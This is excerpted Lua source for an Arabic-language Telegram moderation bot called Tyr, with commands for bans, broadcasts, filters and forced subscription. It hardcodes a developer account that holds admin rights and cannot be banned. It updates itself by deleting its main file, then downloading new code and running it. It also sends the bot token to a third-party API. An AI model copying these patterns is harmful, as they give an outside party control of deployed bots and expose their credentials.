...
SUDO = SUDO
sudo_users = {SUDO,5002442803,5002442803}   
print([[
...
io.popen("cd library && wget https://raw.githubusercontent.com/Tyr-DeV/Tyr/main/library/redis.lua") 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/BOBBW/Files_Tyr/main/File_Bot/commands.lua") 
...
if hash or SudoBot(msg) or DevTyrW(msg) or Sudo(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevTyrW(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevTyrW(msg) or Sudo(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevTyrW(msg) or Sudo(msg) or BasicConstructor(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true
else
return false
end 
...
if hash or SudoBot(msg) or DevTyrW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true
else
return false
end 
...
if hash or SudoBot(msg) or DevTyrW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true
else
return false
end 
...
if hash or SudoBot(msg) or DevTyrW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if tonumber(user_id) == tonumber(5002442803) then  
var = true  
elseif tonumber(user_id) == tonumber(5002442803) then
var = true  
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"@R8GGG")  
...
--------------------------------------------------------------------------------------------------------------
function SourceTyr(msg,data) -- بداية العمل راغنار
if msg then
...
local list = database:smembers(bot_id.."Tyr1:List:Filter"..sl)
...
if not DevTyrW(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if DevTyrW(msg) and msg.reply_to_message_id_ ~= 0  then
...
send(msg.chat_id_, msg.id_,Tyr_Msg) 
return false  
end 
if text then
...
if text == 'تفعيل التواصل ✯' and DevTyrW(msg) then  
...
if text == 'تعطيل التواصل ✯' and DevTyrW(msg) then  
...
if text == 'تفعيل البوت الخدمي ✯' and DevTyrW(msg) then  
...
if text == 'تعطيل البوت الخدمي ✯' and DevTyrW(msg) then  
...
if text == 'ضع كليشه ستارت ✯' and DevTyrW(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' *✯︙ارسل لي الكليشه الان*')
return false
end
if text == 'حذف كليشه ستارت ✯' and DevTyrW(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' *✯︙تم حذف كليشه ستارت*')
end
if text == 'معلومات السيرفر ✯' and DevTyrW(msg) then 
...
if text == 'تحديث السورس ✯' and DevTyrW(msg) then 
os.execute('rm -rf Tyr.lua')
os.execute('wget https://raw.githubusercontent.com/Tyr-DeV/Tyr/main/Tyr.lua')
send(msg.chat_id_, msg.id_,' *✯︙تم تحديث السورس* \n*✯︙لديك اخر اصدار لسورس بويكا*\n*✯︙الاصدار » { 2.8v}*')
dofile('Tyr.lua')  
end
if text == 'الاصدار ✯' and DevTyrW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' *✯︙اصدار سورس بويكا* \n*✯︙الاصدار »{ 2.8v}*')
end
if text == 'قناه تحديثات البوت ✯' and DevTyrW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ✯︙[تحديثات البوت](https://t.me/D9PPP) \n✯︙[قناه السورس](t.me/pvv_v)')
end
if text == "ضع اسم للبوت ✯" and DevTyrW(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," *✯︙ارسل اليه الاسم الان* ")
return false
end
if text == 'الاحصائيات ✯' and DevTyrW(msg) then 
...
if text == 'المشتركين ✯' and DevTyrW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n *✯︙المشتركين» {`'..Users..'`}*'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الكروبات ✯' and DevTyrW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n *✯︙الكروبات» {`'..Groups..'`}*'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين ✯") and DevTyrW(msg) then
...
if text == ("قائمه العام ✯") and DevTyrW(msg) then
...
if text == ("قائمه الكتم العام ✯") and DevTyrW(msg) then
...
if text=="اذاعه خاص ✯" and msg.reply_to_message_id_ == 0 and DevTyrW(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *✯︙ارسل الان اذاعتك؟* \n*✯︙للخروج ارسل الغاء* ")
return false
end 
if text=="اذاعه ✯" and msg.reply_to_message_id_ == 0 and DevTyrW(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *✯︙ارسل الان اذاعتك؟* \n*✯︙للخروج ارسل الغاء* ")
return false
end  
if text=="اذاعه بالتثبيت ✯" and msg.reply_to_message_id_ == 0 and DevTyrW(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *✯︙ارسل الان اذاعتك؟* \n*✯︙للخروج ارسل الغاء* ")
return false
end 
if text=="اذاعه بالتوجيه ✯" and msg.reply_to_message_id_ == 0  and DevTyrW(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *✯︙ارسل لي التوجيه الان*")
return false
end 
if text=="اذاعه بالتوجيه خاص ✯" and msg.reply_to_message_id_ == 0  and DevTyrW(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✯︙ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه ✯' and DevTyrW(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ✯" and DevTyrW(msg) then
...
if text == "تنظيف الكروبات ✯" and DevTyrW(msg) then 
...
send(msg.chat_id_, msg.id_,'*✯︙عدد الكروبات الان » { '..#group..' }'..Tyrk..''..Tyr..'*\n*✯︙الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات*\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevTyrW(msg) then
...
if text and text:match("^رفع مطور (%d+)$") and DevTyrW(msg) then
...
if text and text:match("^تنزيل مطور @(.*)$") and DevTyrW(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevTyrW(msg) then
...
local Tyr1_Msg = database:get(bot_id.."Tyr1:Add:Filter:Rp2"..text..msg.chat_id_)   
if Tyr1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
--------------------------------------------------------------------------------------------------------------
if Tyr_Msg and not Special(msg) then  
local Tyr_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Tyr_Msg then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevTyrW(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevTyrW(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevTyrW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' *✯︙حسنآ ارسل لي معرف القناة*')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevTyrW(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' *✯︙حسنآ ارسل لي النص الذي تريده*')
return false  
end
if text == "حذف رساله الاشتراك ✯" and DevTyrW(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " *✯︙تم مسح رساله الاشتراك* ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ✯$") and DevTyrW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' *✯︙حسنآ ارسل لي معرف القناة*')
return false  
end
if text == "تفعيل الاشتراك الاجباري ✯" and DevTyrW(msg) then  
...
if text == "تعطيل الاشتراك الاجباري ✯" and DevTyrW(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " *✯︙تم تعطيل الاشتراك الاجباري* ")
return false  
end
if text == "الاشتراك الاجباري ✯" and DevTyrW(msg) then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
...
database:sadd(bot_id.."Tyr:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."Tyr:blocname"..msg.chat_id_)
...
if t2.id_ then 
name_Tyr = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_Tyr then 
names_Tyr = database:smembers(bot_id.."Tyr:blocname"..msg.chat_id_) or ""
if names_Tyr and names_Tyr[1] then 
for i=1,#names_Tyr do 
if name_Tyr:match("(.*)("..names_Tyr[i]..")(.*)") then 
...
database:set(bot_id.."Tyr:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."Tyr:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."Tyr:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."Tyr:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."Tyr:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function amir_Tyra_new(Tyr1,Tyr2)
if Tyr2 and Tyr2.first_name_ then 
if Tyr2.first_name_:match("(.*)"..database:get(bot_id.."Tyr:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."Tyr:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local Tyr_nnn = database:get(bot_id.."Tyr:nump"..msg.chat_id_) or 5
local Tyr_nnn2 = database:get(bot_id.."Tyr:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(Tyr_nnn2) == tonumber(Tyr_nnn) or tonumber(Tyr_nnn2) > tonumber(Tyr_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."Tyr:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "✯︙عزيزي >>["..Tyr2.username_.."](https://t.me/"..(Tyr2.username_ or "pvv_v")..")\n✯︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."Tyr:teh"..msg.chat_id_).."} بجانب اسمك\n✯︙عدد المحاولات المتبقيه {"..(tonumber(Tyr_nnn) - tonumber(Tyr_nnn2)).."}")
end
end
end
end
bnnaGet(id, amir_Tyra_new)
end
end
...
local TyrChengName = database:get(bot_id.."Tyr:Cheng:Name"..data.id_)
if not data.first_name_ then 
if TyrChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..TyrChengName..']')
database:del(bot_id.."Tyr:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if TyrChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."Tyr:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local TyrChengUserName = database:get(bot_id.."Tyr:Cheng:UserName"..data.id_)
if not data.username_ then 
if TyrChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..TyrChengUserName..']')
database:del(bot_id.."Tyr:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if TyrChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."Tyr:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local TyrChengPhoto = database:get(bot_id.."Tyr:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if TyrChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."Tyr:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if TyrChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."Tyr:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
local url,res = https.request('https://Tyr-api.ml/ChatMember.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.info ~= true then
send(msg.chat_id_,msg.id_,'✫: شترك في قناة السورس اولآ @BOBBW .')   
return false 
end
Text = "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ Source Tyr\n\n[-  ᵀᵞᴿᴋᴀ ᴄʜᴀɴɴᴇʟ  .](http://https://t.me/D9PPP)\n\n[-  ɪɴғᴏ sᴏᴜʀᴄᴇ .](http://t.me/pvv_v)\n\n[-  ᵀᵞᴿᴋᴀ ᴅᴇᴠᴇʟᴏᴘᴇʀ  .](http://t.me/KKKKK4)\n\n[-  ʙᴏᴛ ᵀᵞᴿᴋᴀ .](http://t.me/rriebot)"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✫: ᵀᵞᴿᴋᴀ sᴏᴜʀᴄʀ .',url="https://t.me/D9PPP/567"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://https://t.me/D9PPP&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
if text == 'رفع نسخه الاحتياطيه' and DevTyrW(msg) then  
if tonumber(msg.reply_to_message_id_) > 0 then
...
local msg_id = msg.id_/2097152/0.5
local done = json:decode(https.request("https://Tyr-api.ml/Do/searchinbot.php?token="..token.."&chat_id="..msg.chat_id_.."&from="..msg.sender_user_id_.."&msg="..msg_id.."&Text="..TextSearch.."&n=s")) 
end
end
...
------------------------------------------------------------------------ امـيـر الـدلـيـم
if text == 'تحديث' and DevTyrW(msg) then
dofile('Tyr.lua')  
send(msg.chat_id_, msg.id_, ' *✯︙تم تحديث جميع الملفات*') 
end 
if text == ("مسح قائمه العام") and DevTyrW(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevTyrW(msg) then  
function start_function(extra, result, success)
if TyrSudoBot(result.sender_user_id_) then
...
if text and text:match("^حظر عام @(.*)$")  and DevTyrW(msg) then  
...
if text and text:match("^حظر عام (%d+)$") and DevTyrW(msg) then  
local userid = text:match("^حظر عام (%d+)$")
if TyrSudoBot(userid) then
send(msg.chat_id_, msg.id_,"*✯︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
end
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevTyrW(msg) then  
function start_function(extra, result, success)
if TyrSudoBot(result.sender_user_id_) then
send(msg.chat_id_, msg.id_,"*✯︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
...
if text and text:match("^كتم عام @(.*)$")  and DevTyrW(msg) then  
...
if text and text:match("^كتم عام (%d+)$") and DevTyrW(msg) then  
local userid = text:match("^كتم عام (%d+)$")
if TyrSudoBot(bot_id) then
send(msg.chat_id_, msg.id_,"*✯︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevTyrW(msg) then  
function start_function(extra, result, success)
...
if text and text:match("^الغاء العام @(.*)$") and DevTyrW(msg) then  
...
if text and text:match("^الغاء العام (%d+)$") and DevTyrW(msg) then  
...
------------------------------------------------------------------------ امـيـر الـدلـيـم
if text == ("مسح المطورين") and DevTyrW(msg) then
...
if text == 'الملفات' and DevTyrW(msg) then
...
if DevTyrW(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Tyr-DeV/Files_Tyr/main/getfile.json")
if res == 200 then
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevTyrW(msg) then
...
local json_file, res = https.request("https://raw.githubusercontent.com/Tyr-DeV/Files_Tyr/main/File_Bot/"..file)
if res == 200 then
...
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevTyrW(msg) then
...
if text == "مسح الملفات" and DevTyrW(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," *✯︙تم مسح الملفات*")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevTyrW(msg) then  
function start_function(extra, result, success)
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevTyrW(msg) then  
function start_function(extra, result, success)
...
function Function_Tyr(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tyr, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tyr, nil)
return false 
end
...
database:set(bot_id.."Tyr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Tyr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," *✯︙ارسل التحذير عند ارسال الكلمه*")  
database:set(bot_id.."Tyr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Tyr1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Tyr1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Tyr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," *✯︙تم منع الكلمه مع التحذير*")  
database:del(bot_id.."Tyr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Tyr1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Tyr1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Tyr1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," *✯︙ارسل الكلمه الان*")  
database:set(bot_id.."Tyr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Tyr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."Tyr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Tyr1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Tyr1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."Tyr1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Tyr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Tyr1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Tyr1:List:Filter"..msg.chat_id_,v)  
end  
...
if text == 'مسح كليشه المطور' and DevTyrW(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' *✯︙تم مسح كليشه المطور*')
end
if text == 'ضع كليشه المطور' and DevTyrW(msg) then
...
if text == 'تفعيل الاذاعه' and DevTyrW(msg) then  
...
if text == 'تعطيل الاذاعه' and DevTyrW(msg) then  
...
send(msg.chat_id_, msg.id_,'['..Tyr_Msg[math.random(#Tyr_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevTyrW(msg) then 
...
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200},function(ta,Tyr)
local t = "\n*ツ قائمة الاعضاء* \n*•━━━━━━ ᵀᵞᴿ ━━━━━━━•*\n"
x = 0
local list = Tyr.members_
for k, v in pairs(list) do
x = x + 1
...
if TyrSudoBot(msg.sender_user_id_) then
database:srem(bot_id..'DEV:Sudo:T', result.sender_user_id_)
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
...
if text == ("مسح ردود المطور") and DevTyrW(msg) then 
...
if text == ("ردود المطور") and DevTyrW(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n ✯︙قائمة ردود المطور \n*•━━━━━━ ᵀᵞᴿ ━━━━━━━•*\n"
for k,v in pairs(list) do
...
if text == 'اضف رد للكل' and DevTyrW(msg) then    
send(msg.chat_id_, msg.id_,' *✯︙ارسل الكلمه تريد اضافتها*')
database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text == 'حذف رد للكل' and DevTyrW(msg) then    
...
if text == 'تفعيل المغادره' and DevTyrW(msg) then   
...
if text == 'تعطيل المغادره' and DevTyrW(msg) then  
...
-- vardump(data) 
Tyrdx(msg.chat_id_, msg.id_, ' *✯︙ايدي المجموعة » ( '..msg.chat_id_..' )*\n*✯︙عدد الادمنيه » ( '..data.administrator_count_..' )*\n*✯︙عدد المحظورين » ( '..data.kicked_count_..' )*\n*✯︙عدد الاعضاء » ( '..data.member_count_..' )*\n', 'md') 
end 
...
if text == 'استعاده الاوامر' and DevTyrW(msg) then
...
{{text = '- Source Tyr', url="https://t.me/D9PPP"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
_key = {
{{text="♟ Chess Game ♟",url='https://t.me/VQGBoT?game=chess'}},
...
{{text="🦖 Dragon Game 🦖",url='https://t.me/VQGBoT?game=dragon'},{text="🐍 3D Snake Game 🐍",url='https://t.me/VQGBoT?game=snake'}},
{{text="🔵 Color Game 🔴",url='https://t.me/VQGBoT?game=color'}},
{{text="🚀 Rocket Game 🚀",url='https://t.me/VQGBoT?game=rocket'},{text="🏹 Arrow Game 🏹",url='https://t.me/VQGBoT?game=arrow'}},
{{text = '- Source Tyr', url="https://t.me/D9PPP"}},
...
zh = https.request('https://Tyr-api.ml/frills.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n*✯︙قائمه الزخرفه* \nٴ✯∫ٴ*•━━━━━━ ᵀᵞᴿ ━━━━━━━•*ٴ✯∫○ٴ \n"
i = 0
...
send(msg.chat_id_, msg.id_, t..'ٴ✯∫ٴ*•━━━━━━ ᵀᵞᴿ ━━━━━━━•*ٴ✯∫○ٴ\n✯︙[- Source Tyr](t.me/pvv_v) ')
end
...
gk = https.request('https://Tyr-api.ml/Horoscopes.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
...
ge = https.request('https://Tyr-api.ml/Calculateage.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
...
data,res = https.request('https://Tyr-api.ml/audios.php')
if res == 200 then
...
{{text = '~ Tyr •',url='http://https://t.me/D9PPP'}},
}
...
https.request("https://Tyr-api.ml/Do/searchinbot.php?V="..URL.escape(id_from_vid).."&ch=do")
end
end
...
https.request("https://Tyr-api.ml/Do/searchinbot.php?token="..token.."&chat_id="..Chat_id.."&data="..URL.escape(DAata).."&n=do")
end
Ok_id  = DAata:match("(%d+)")  
...
inline = {
{{text = 'Source Tyr',url='http://https://t.me/D9PPP'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
...
Tyr = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Tyr)
...
------------------------------------------------------------------------
local TyrAbot = database:get(bot_id.."Tyr1:Add:Filter:Rp2"..text..result.chat_id_)   
if TyrAbot then
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," *✯︙العضو :* {["..data.first_name_.."](T.ME/"..data.username_..")}\n✯︙["..TyrAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local Tyr1_Msg = database:get(bot_id.."Tyr1:Add:Filter:Rp2"..text..result.chat_id_)   
if Tyr1_Msg then
send(msg.chat_id_, msg.id_," ✯︙"..Tyr1_Msg)
